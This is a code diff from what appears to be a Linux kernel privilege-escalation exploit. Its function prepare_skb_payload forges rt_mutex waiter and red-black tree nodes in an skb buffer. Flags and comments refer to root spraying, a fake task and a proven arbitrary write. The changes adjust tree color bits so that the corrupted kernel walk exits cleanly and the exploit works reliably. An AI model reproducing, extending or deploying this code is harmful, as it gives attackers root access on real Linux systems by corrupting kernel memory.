@@ -1870,8 +1870,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         pr_info("mode4 LOCK_EMPTY waiters=0 owner=0 (isolation)\n");
     } else if (payload_mode == PAGE_PAYLOAD_FOPS &&
                (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0) ||
-                env_flag("MODE4_PAD3", 0) || env_flag("MODE4_ROOT_SPRAY", 0)) &&
-               !env_flag("MODE4_OWNER_TASK", 0)) {
+                env_flag("MODE4_PAD3", 0) || env_flag("MODE4_ROOT_SPRAY", 0) ||
+                env_flag("MODE4_LOCK_EMPTY", 0))) {
       /*
        * owner=1 (NULL|HAS_WAITERS) → clean exit after rb_erase, skip fake_task
        * setprio. bootid write-proof + ROOT_SPRAY proven with this.
@@ -1955,11 +1955,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
      * Single-node classic/legacy: gadget fields on W0.pi only. */
     if (mode4_two_node) {
       /* ---- Node W0 (waiter @ W0_OFF): clean black PI root ---- */
-      put64(p, W0_OFF + 0x00, 1); /* main tree: inert black leaf */
+      put64(p, W0_OFF + 0x00, 0); /* main tree: black ROOT (pc=1=RED is invalid) */
       put64(p, W0_OFF + 0x08, 0);
       put64(p, W0_OFF + 0x10, 0);
       /* W0.pi @ +0x18: __rb_parent_color=1 (BLACK, parent NULL) */
-      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 1);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 0);
       /* rb_right → W1 (SCRATCH rb_node) */
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, w1_node);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0);
@@ -1971,14 +1971,21 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, W0_OFF + 0x00, write_pc);
       put64(p, W0_OFF + 0x08, write_right);
       put64(p, W0_OFF + 0x10, write_left);
-      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 1);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 0);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0);
     } else {
-      put64(p, W0_OFF + 0x00, 1);
+      put64(p, W0_OFF + 0x00, 0);
       put64(p, W0_OFF + 0x08, 0);
       put64(p, W0_OFF + 0x10, 0);
-      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+      /* PI pc = value|BLACK(0): after the erase delivers, the chain's
+       * re-enqueue walks this node's pc — an EVEN value reads as a black
+       * node → rb_insert_color terminates immediately (black parent rule
+       * applies to the LINKED parent, but the entry check on the node
+       * itself exits when its own pc has bit0=0? no: entry reads parent
+       * existence). Keep pc even = kernel-safe pointer arithmetic. */
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
+            write_pc & ~1ULL);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
     }
@@ -2063,11 +2070,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, W0_OFF + 0x10, write_left);
       put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
       put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 1);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 0);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0);
     } else {
-      put64(p, W0_OFF + 0x00, 1);
+      put64(p, W0_OFF + 0x00, 0);
       put64(p, W0_OFF + 0x08, 0);
       put64(p, W0_OFF + 0x10, 0);
       put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
